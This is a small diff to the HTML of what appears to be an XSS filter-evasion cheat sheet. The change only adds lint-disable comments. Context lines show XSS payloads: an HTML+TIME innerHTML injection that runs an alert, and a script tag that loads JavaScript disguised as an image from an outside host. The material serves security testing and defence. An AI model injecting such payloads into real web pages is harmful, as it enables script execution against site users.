@@ -6776,7 +6776,10 @@ to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&
 <span class="p">&lt;</span><span class="nt">t:set</span> <span class="na">attributeName</span><span class="o">=</span><span class="s">&quot;innerHTML&quot;</span> <span class="na">to</span><span class="o">=</span><span class="s">&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;</span><span class="na">XSS</span><span class="err">&quot;)&lt;/</span><span class="na">SCRIPT</span><span class="p">&gt;</span>&quot;&gt;
 <span class="p">&lt;/</span><span class="nt">BODY</span><span class="p">&gt;&lt;/</span><span class="nt">HTML</span><span class="p">&gt;</span>
 </code></pre></div>
+<!-- textlint-disable terminology -->
 <p>(This is how Grey Magic hacked Hotmail and Yahoo!)</p>
+<!-- textlint-enable terminology -->
+
 <h3 id="assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js">Assuming you can only fit in a few characters and it filters against <code>.js</code><a class="headerlink" href="#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js" title="Permanent link">&para;</a></h3>
 <p>This attack allows you to rename your JavaScript file to an image as an XSS vector:</p>
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/xss.jpg&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
